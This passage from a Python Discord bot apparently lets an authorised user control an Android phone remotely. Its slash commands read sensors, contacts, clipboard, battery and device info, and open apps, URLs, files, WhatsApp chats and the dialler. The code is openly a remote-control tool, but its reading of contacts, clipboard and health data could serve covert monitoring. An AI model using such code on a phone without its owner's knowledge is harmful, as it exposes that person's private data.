        await interaction.followup.send(
            "❌ **صلاحية مستشعرات الجسم غير ممنوحة**\n\n"
            "افتح التطبيق → الأذونات → فعّل **مستشعرات الجسم**"
        )
        return

    value = result.get("value")
    if value is None:
        await interaction.followup.send("❌ لم أتمكن من قراءة النبض.")
        return

    await interaction.followup.send(
        f"❤️ **نبضات القلب:**\n"
        f"💓 **{value:.0f} BPM**\n"
        f"📡 المستشعر: `{result.get('sensor', '?')}`"
    )


@bot.tree.command(name="steps", description="🏃 عدد الخطوات")
async def steps_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("steps")
    await interaction.response.defer()
    if not await _ensure_bridge(interaction):
        return

    try:
        data = await asyncio.to_thread(_bridge.read_step_counter)
        result = json.loads(data) if data else {}
    except Exception as e:
        await interaction.followup.send(f"❌ {e}")
        return

    if result.get("status") == "no_sensor":
        await interaction.followup.send(
            "❌ **الجهاز لا يحتوي على مستشعر عدّ الخطوات.**"
        )
        return
    if result.get("status") == "timeout":
        await interaction.followup.send("⏰ لم يحصل قراءة.")
        return

    value = result.get("value")
    if value is None:
        await interaction.followup.send("❌ لم أتمكن من القراءة.")
        return

    await interaction.followup.send(
        f"🏃 **عدد الخطوات:**\n"
        f"👣 **{int(value)}** خطوة\n"
        f"📡 المستشعر: `{result.get('sensor', '?')}`"
    )


@bot.tree.command(name="accelerometer", description="📊 مستشعر التسارع")
async def accelerometer_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("accelerometer")
    await interaction.response.defer()
    if not await _ensure_bridge(interaction):
        return

    try:
        data = await asyncio.to_thread(_bridge.read_accelerometer)
        result = json.loads(data) if data else {}
    except Exception as e:
        await interaction.followup.send(f"❌ {e}")
        return

    if result.get("status") == "no_sensor":
        await interaction.followup.send(
            "❌ **الجهاز لا يحتوي على مستشعر التسارع.**"
        )
        return
    if result.get("status") == "timeout":
        await interaction.followup.send("⏰ لم يحصل قراءة.")
        return

    x = result.get("x", 0)
    y = result.get("y", 0)
    z = result.get("z", 0)

    await interaction.followup.send(
        f"📊 **مستشعر التسارع:**\n"
        f"➡️ X: `{x:.2f}` m/s²\n"
        f"⬆️ Y: `{y:.2f}` m/s²\n"
        f"🔵 Z: `{z:.2f}` m/s²"
    )


@bot.tree.command(name="gyroscope", description="🌀 مستشعر الجيروسكوب")
async def gyroscope_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("gyroscope")
    await interaction.response.defer()
    if not await _ensure_bridge(interaction):
        return

    try:
        data = await asyncio.to_thread(_bridge.read_gyroscope)
        result = json.loads(data) if data else {}
    except Exception as e:
        await interaction.followup.send(f"❌ {e}")
        return

    if result.get("status") == "no_sensor":
        await interaction.followup.send(
            "❌ **الجهاز لا يحتوي على جيروسكوب.**"
        )
        return
    if result.get("status") == "timeout":
        await interaction.followup.send("⏰ لم يحصل قراءة.")
        return

    x = result.get("x", 0)
    y = result.get("y", 0)
    z = result.get("z", 0)

    await interaction.followup.send(
        f"🌀 **الجيروسكوب:**\n"
        f"➡️ X: `{x:.3f}` rad/s\n"
        f"⬆️ Y: `{y:.3f}` rad/s\n"
        f"🔵 Z: `{z:.3f}` rad/s"
    )


# ═══════════════════════════════════════════════════════════════════
#                       جهات الاتصال
# ═══════════════════════════════════════════════════════════════════
@bot.tree.command(name="contacts", description="👥 جهات الاتصال")
@app_commands.describe(search="بحث")
async def contacts_cmd(interaction: discord.Interaction, search: str = None):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("contacts")
    await interaction.response.defer()
    if not await _ensure_bridge(interaction):
        return
    data = await asyncio.to_thread(_bridge.get_contacts, search or "")
    try:
        arr = json.loads(data)
    except Exception:
        arr = []
    if not arr:
        await interaction.followup.send("👥 لا توجد جهات اتصال.")
        return
    lines = [f"👥 **{len(arr)} جهة**"
             + (f" (بحث: `{search}`)" if search else "") + ":\n"]
    for c in arr[:30]:
        lines.append(
            f"• **{c.get('name', '?')}** — `{c.get('number', '?')}`")
    if len(arr) > 30:
        lines.append(f"\n... و {len(arr)-30} أخرى")
    await interaction.followup.send("\n".join(lines)[:1900])


# ═══════════════════════════════════════════════════════════════════
#                       التطبيقات
# ═══════════════════════════════════════════════════════════════════
@bot.tree.command(name="openapp", description="📱 افتح تطبيقًا")
@app_commands.describe(app="اسم التطبيق أو الحزمة")
async def openapp_cmd(interaction: discord.Interaction, app: str):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("openapp")
    await interaction.response.defer()
    if not await _ensure_bridge(interaction):
        return
    query = app.strip()
    if query.lower() in ("whatsapp", "wa"):
        result = await asyncio.to_thread(_bridge.open_whatsapp_home)
    else:
        result = await asyncio.to_thread(_bridge.open_app, query)
    await interaction.followup.send(result)


@bot.tree.command(name="apps", description="📱 قائمة التطبيقات")
@app_commands.describe(search="بحث")
async def apps_cmd(interaction: discord.Interaction, search: str = None):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("apps")
    await interaction.response.defer()
    if not await _ensure_bridge(interaction):
        return
    apps = await asyncio.to_thread(_bridge.list_installed_apps)
    if not apps:
        await interaction.followup.send("❌ لم أتمكن من قراءة التطبيقات.")
        return
    if search:
        q = search.lower()
        apps = [p for p in apps if q in p.lower()]
    apps = sorted(apps)
    if not apps:
        await interaction.followup.send("لا نتائج.")
        return
    chunks = [apps[i:i+25] for i in range(0, min(len(apps), 100), 25)]
    for chunk in chunks[:4]:
        options = [discord.SelectOption(label=p[:100],
                                         value=short_key(p))
                   for p in chunk]
        view = discord.ui.View(timeout=900)
        select = discord.ui.Select(
            placeholder=f"اختر تطبيقًا (إجمالي {len(apps)})",
            options=options
        )

        async def cb(it):
            if not _check(it):
                await it.response.send_message(
                    "غير مصرح.", ephemeral=True)
                return
            key = it.data["values"][0]
            pkg = resolve_key(key)
            await it.response.defer()
            result = await asyncio.to_thread(_bridge.open_app, pkg)
            await it.followup.send(f"{result}")

        select.callback = cb
        view.add_item(select)
        await interaction.followup.send(
            f"📱 **{len(apps)} تطبيق**"
            + (f" (بحث: `{search}`)" if search else ""),
            view=view
        )


@bot.tree.command(name="openurl", description="🔗 افتح رابطًا")
@app_commands.describe(url="الرابط")
async def openurl_cmd(interaction: discord.Interaction, url: str):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("openurl")
    await interaction.response.defer()
    if not await _ensure_bridge(interaction):
        return
    result = await asyncio.to_thread(_bridge.open_url, url.strip())
    await interaction.followup.send(f"{result}\n`{url}`")


@bot.tree.command(name="open", description="📂 افتح ملفًا")
@app_commands.describe(path="المسار")
async def open_cmd(interaction: discord.Interaction, path: str):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("open")
    if not is_path_allowed(path) or not os.path.isfile(path):
        await interaction.response.send_message(
            "مسار غير صالح.", ephemeral=True)
        return
    await interaction.response.defer()
    if not await _ensure_bridge(interaction):
        return
    result = await asyncio.to_thread(_bridge.open_file, path)
    await interaction.followup.send(f"{result}\n`{path}`")


# ═══════════════════════════════════════════════════════════════════
#                       المفضلة والرفع
# ═══════════════════════════════════════════════════════════════════
@bot.tree.command(name="save", description="⭐ أضف للمفضلة")
@app_commands.describe(path="المسار", label="اسم مختصر")
async def save_cmd(interaction: discord.Interaction, path: str,
                    label: str = None):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("save")
    if not is_path_allowed(path) or not os.path.isdir(path):
        await interaction.response.send_message(
            "مسار غير صالح.", ephemeral=True)
        return
    FAVORITES.append({
        "path": path,
        "label": label or os.path.basename(path) or path
    })
    await interaction.response.send_message(f"⭐ حُفظ: `{path}`")


@bot.tree.command(name="favorites", description="⭐ اعرض المفضلة")
async def favorites_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("favorites")
    if not FAVORITES:
        await interaction.response.send_message(
            "لا توجد مفضلات. استخدم `/save`.", ephemeral=True)
        return
    options = [discord.SelectOption(
        label=f["label"][:100],
        value=short_key(f["path"]),
        description=f["path"][:100]
    ) for f in FAVORITES[:25]]
    view = discord.ui.View(timeout=900)
    select = discord.ui.Select(placeholder="اختر مجلدًا", options=options)

    async def cb(it):
        if not _check(it):
            await it.response.send_message("غير مصرح.", ephemeral=True)
            return
        key = it.data["values"][0]
        p = resolve_key(key)
        if not p or not os.path.isdir(p):
            await it.response.send_message("غير موجود.", ephemeral=True)
            return
        v = FileBrowserView(p, 0)
        try:
            await it.response.edit_message(content=v.title(), view=v)
        except Exception:
            await it.response.send_message(content=v.title(), view=v)

    select.callback = cb
    view.add_item(select)
    await interaction.response.send_message("⭐ المفضلة:", view=view)


@bot.tree.command(name="upload", description="📥 معلومات الرفع")
async def upload_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("upload")
    await interaction.response.send_message(
        f"📥 أرسل أي ملف كمرفق وسيُحفظ في:\n`{UPLOAD_DIR}`",
        ephemeral=True
    )


# ═══════════════════════════════════════════════════════════════════
#                       واتساب
# ═══════════════════════════════════════════════════════════════════
@bot.tree.command(name="wa_home", description="💬 واتساب الرئيسية")
async def wa_home_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("wa_home")
    await interaction.response.defer()
    if not await _ensure_bridge(interaction):
        return
    result = await asyncio.to_thread(_bridge.open_whatsapp_home)
    await interaction.followup.send(result)


@bot.tree.command(name="wa", description="💬 فتح محادثة واتساب")
@app_commands.describe(phone="الرقم", text="نص جاهز")
async def wa_cmd(interaction: discord.Interaction, phone: str = None,
                  text: str = None):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("wa")
    await interaction.response.defer()
    if not await _ensure_bridge(interaction):
        return
    result = await asyncio.to_thread(
        _bridge.open_whatsapp_chat, phone or "", text or "")
    await interaction.followup.send(result)


# ═══════════════════════════════════════════════════════════════════
#                       الأدوات
# ═══════════════════════════════════════════════════════════════════
@bot.tree.command(name="dial", description="📞 لوحة الاتصال")
@app_commands.describe(phone="الرقم")
async def dial_cmd(interaction: discord.Interaction, phone: str):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("dial")
    await interaction.response.defer()
    if not await _ensure_bridge(interaction):
        return
    result = await asyncio.to_thread(_bridge.dial, phone)
    await interaction.followup.send(result)


@bot.tree.command(name="battery", description="🔋 حالة البطارية")
async def battery_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("battery")
    await interaction.response.defer()
    if not await _ensure_bridge(interaction):
        return
    data = await asyncio.to_thread(_bridge.get_battery)
    try:
        d = json.loads(data)
        if not d:
            await interaction.followup.send(
                "❌ لم أتمكن من قراءة البطارية.")
            return
        await interaction.followup.send(
            f"🔋 **{d.get('percentage', '?')}%**\n"
            f"📊 الحالة: `{d.get('status', '?')}`\n"
            f"🌡️ الحرارة: `{d.get('temperature_c', '?')}°C`\n"
            f"💚 الصحة: `{d.get('health', '?')}`\n"
            f"⚡ الشحن: `{d.get('plugged', '?')}`"
        )
    except Exception as e:
        await interaction.followup.send(f"خطأ: {e}")


@bot.tree.command(name="clipboard", description="📋 قراءة الحافظة")
async def clipboard_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("clipboard")
    await interaction.response.defer()
    if not await _ensure_bridge(interaction):
        return
    text = await asyncio.to_thread(_bridge.get_clipboard)
    if text:
        await interaction.followup.send(
            f"📋 **الحافظة:**\n```\n{text[:1800]}\n```")
    else:
        await interaction.followup.send("📋 الحافظة فارغة.")


@bot.tree.command(name="toast", description="💬 رسالة على الشاشة")
@app_commands.describe(text="النص")
async def toast_cmd(interaction: discord.Interaction, text: str):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("toast")
    await interaction.response.defer()
    if not await _ensure_bridge(interaction):
        return
    ok = await asyncio.to_thread(_bridge.show_toast, text[:100])
    await interaction.followup.send(
        "✅ ظهرت الرسالة" if ok else "❌ فشل")


# ═══════════════════════════════════════════════════════════════════
#                       التخزين
# ═══════════════════════════════════════════════════════════════════
@bot.tree.command(name="roots", description="📚 جذور التخزين")
async def roots_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("roots")
    if not DISCOVERED_ROOTS:
        await interaction.response.send_message(
            "لا جذور!", ephemeral=True)
        return
    lines = ["**📚 جذور التخزين:**\n"]
    for i, r in enumerate(DISCOVERED_ROOTS, 1):
        marker = " ⭐" if r == ALLOWED_ROOT else ""
        lines.append(f"`{i}.` `{r}`{marker}")
    lines.append(f"\n**النشط:** `{ALLOWED_ROOT}`")
    await interaction.response.send_message("\n".join(lines))


@bot.tree.command(name="setroot", description="📁 عيّن جذرًا")
@app_commands.describe(path="المسار")
async def setroot_cmd(interaction: discord.Interaction, path: str):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("setroot")
    global ALLOWED_ROOT
    if not os.path.isdir(path):
        await interaction.response.send_message(
            f"ليس مجلدًا: `{path}`", ephemeral=True)
        return
    real = os.path.realpath(path)
    if real not in [os.path.realpath(r) for r in DISCOVERED_ROOTS]:
        DISCOVERED_ROOTS.append(real)
    ALLOWED_ROOT = real
    await interaction.response.send_message(
        f"✅ الجذر الآن: `{ALLOWED_ROOT}`")


@bot.tree.command(name="rescan", description="🔄 إعادة اكتشاف الجذور")
async def rescan_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("rescan")
    global DISCOVERED_ROOTS, ALLOWED_ROOT
    await interaction.response.defer()
    old = set(DISCOVERED_ROOTS)
    DISCOVERED_ROOTS = _discover_storage_roots()
    new = set(DISCOVERED_ROOTS) - old
    if DISCOVERED_ROOTS:
        ALLOWED_ROOT = DISCOVERED_ROOTS[0]
    msg = [
        f"🔄 اكتمل",
        f"📚 الإجمالي: **{len(DISCOVERED_ROOTS)}**",
        f"🆕 جديد: **{len(new)}**",
        f"📁 النشط: `{ALLOWED_ROOT}`",
    ]
    await interaction.followup.send("\n".join(msg))


@bot.tree.command(name="storage_test", description="🔬 اختبار الوصول للتخزين")
async def storage_test_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("storage_test")
    await interaction.response.defer()
    if not await _ensure_bridge(interaction):
        return
    try:
        result = await asyncio.to_thread(_bridge.test_storage_access)
    except Exception as e:
        result = f"❌ {e}"
    await interaction.followup.send(
        f"🔍 **نتائج اختبار التخزين:**\n```json\n{result}\n```")


# ═══════════════════════════════════════════════════════════════════
#                       معلومات
# ═══════════════════════════════════════════════════════════════════
@bot.tree.command(name="ip", description="🌐 عنوان IP العام")
async def ip_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("ip")
    await interaction.response.defer()
    try:
        import requests
        r = requests.get("https://api.ipify.org?format=json", timeout=10)
        await interaction.followup.send(f"🌐 IP: `{r.json().get('ip')}`")
    except Exception as e:
        await interaction.followup.send(f"❌ {e}")


@bot.tree.command(name="sysinfo", description="💻 معلومات الجهاز")
async def sysinfo_cmd(interaction: discord.Interaction):
    if not _check(interaction):
        await interaction.response.send_message("غير مصرح.", ephemeral=True)
        return
    STATS.record_command("sysinfo")
    await interaction.response.defer()
    info = [
        f"🖥️ **الجهاز:** `{DEVICE_NAME}`",
        f"💻 **النظام:** `{platform.system()} {platform.release()}`",
        f"🐍 **Python:** `{sys.version.split()[0]}`",
        f"🤖 **البوت:** `v{VERSION}`",
        f"📁 **الجذر:** `{ALLOWED_ROOT}`",
        f"📚 **الجذور:** **{len(DISCOVERED_ROOTS)}**",
        f"🖼️ **PIL:** {'✅' if HAS_PIL else '❌'}",
        f"🌉 **bridge:** {'✅' if _BRIDGE_AVAILABLE else '❌'}",
        f"⚡ **Cache:** `{LIST_CACHE.size()}` عنصر",
        f"⏱️ **التشغيل:** `{STATS._fmt_time(STATS.uptime())}`",
    ]
    if _bridge_ready():
        try:
            dev = await asyncio.to_thread(_bridge.get_device_info)
            d = dev if isinstance(dev, dict) else {}
            info.append(f"\n📱 **الطراز:** `{d.get('model', '?')}`")
            info.append(f"🏭 **المُصنّع:** `{d.get('manufacturer', '?')}`")
            info.append(f"🤖 **أندرويد:** `{d.get('android', '?')}`")
            info.append(f"🔧 **SDK:** `{d.get('sdk', '?')}`")
        except Exception:
            pass
    await interaction.followup.send("\n".join(info))


# ═══════════════════════════════════════════════════════════════════
#                       Helper للتحقق من ContactsBridge
# ═══════════════════════════════════════════════════════════════════
def _is_contacts_ready() -> bool:
    try:
        from java import jclass
        ContactsBridge = jclass("com.example.myfirstapp.ContactsBridge")
        return bool(ContactsBridge.isReady())
    except Exception:
        return False


# ═══════════════════════════════════════════════════════════════════
#                       start_bot / stop_bot / get_bot_status
# ═══════════════════════════════════════════════════════════════════
_bot_start_lock = threading.RLock()


def start_bot(
    token: str,
    prefix: str = "!",
    owner_id: Optional[int] = None,
    guild_id: Optional[int] = None,
    allowed_user_id: Optional[int] = None,
    enable_message_content: bool = True,
    enable_members: bool = False,
    enable_presences: bool = False,
    enable_all_intents: bool = False,
) -> str:
    global bot

    log.info("=" * 60)
    log.info(f"🚀 start_bot() — v{VERSION}")
    log.info(f"👑 owner={owner_id} | guild={guild_id} | allowed={allowed_user_id}")
    log.info("=" * 60)

    if not token:
        msg = "❌ التوكن فارغ"
        log.error(msg)
        return msg

    with _bot_start_lock:
        if STATE.is_running:
            log.warning("⚠️ إيقاف البوت القديم...")
            _stop_internal()
            time.sleep(1)

    with STATE._lock:
        STATE.token = token.strip()
        STATE.prefix = prefix or DEFAULT_PREFIX
        STATE.owner_id = int(owner_id) if owner_id else None
        STATE.guild_id = int(guild_id) if guild_id else None
        STATE.allowed_user_id = int(allowed_user_id) if allowed_user_id else None

    _ready_called["value"] = False
    _synced_once["value"] = False

    if STATE.owner_id:
        try:
            bot.owner_id = int(STATE.owner_id)
            log.info(f"👑 bot.owner_id = {bot.owner_id}")
        except Exception as e:
            log.warning(f"owner_id assignment failed: {e}")

    STATE.mark_running()

    try:
        log.info("▶️ bot.start() starting...")
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        with STATE._lock:
            STATE.loop = loop

        loop.run_until_complete(bot.start(STATE.token))
        log.info("⏹️ bot.start() ended")
        return "✅ تم إيقاف البوت"

    except discord.LoginFailure:
        msg = "❌ تسجيل الدخول فشل: التوكن غير صحيح"
        log.error(msg)
        STATE.set_error(msg)
        return msg

    except discord.PrivilegedIntentsRequired:
        msg = (
            "❌ فعّل Privileged Intents:\n"
            "1. discord.com/developers/applications\n"
            "2. تطبيقك → Bot\n"
            "3. فعّل Message Content Intent"
        )
        log.error(msg)
        STATE.set_error(msg)
        return msg

    except discord.HTTPException as e:
        msg = f"❌ HTTP: {e}"
        log.error(msg)
        STATE.set_error(msg)
        return msg

    except KeyboardInterrupt:
        return "⏹️ إيقاف يدوي"

    except Exception as e:
        log.exception("start_bot failed", e)
        STATE.set_error(str(e))
        return f"❌ خطأ: {e}"

    finally:
        STATE.mark_stopped()


def _stop_internal():
    try:
        with STATE._lock:
            loop = STATE.loop
        if bot is not None and not bot.is_closed() and loop is not None:
            try:
                fut = asyncio.run_coroutine_threadsafe(bot.close(), loop)
                try:
                    fut.result(timeout=5)
                except Exception:
                    pass
            except Exception as e:
                log.debug(f"_stop_internal: {e}")
    except Exception as e:
        log.warning(f"_stop_internal outer: {e}")


def stop_bot() -> str:
    log.info("⏹️ stop_bot() called")
    try:
        STATE.get_stop_event().set()
        _stop_internal()
        return "✅ تم الإرسال"
    except Exception as e:
        log.exception("stop_bot failed", e)
        return f"❌ فشل: {e}"


def get_bot_status() -> Dict[str, Any]:
    if bot is None:
        return {"running": False, "reason": "not_initialized"}
    if bot.is_closed():
        return {"running": False, "reason": "closed"}

    with STATE._lock:
        start = STATE.start_time
        uptime = int(time.time() - start) if start else 0
        is_running = STATE.is_running
        last_error = STATE.last_error

    try:
        user_name = str(bot.user) if bot.user else None
        user_id = bot.user.id if bot.user else None
    except Exception:
        user_name = None
        user_id = None

    return {
        "running": is_running,
        "user": user_name,
        "user_id": user_id,
        "guilds": len(bot.guilds),
        "latency_ms": round(bot.latency * 1000) if bot.latency else 0,
        "uptime_seconds": uptime,
        "last_error": last_error,
        "version": VERSION,
        "bridge_available": _BRIDGE_AVAILABLE,
        "contacts_ready": _is_contacts_ready(),
    }


def is_contacts_bridge_ready() -> bool:
    return _is_contacts_ready()


# ═══════════════════════════════════════════════════════════════════
#                       تسجيل أولي
# ═══════════════════════════════════════════════════════════════════
log.info(f"✅ hawkmoth_bot.py v{VERSION} loaded")
log.info(f"   • bridge:  {_BRIDGE_AVAILABLE}")
log.info(f"   • PIL:     {HAS_PIL}")
log.info(f"   • Roots:   {len(DISCOVERED_ROOTS)}")
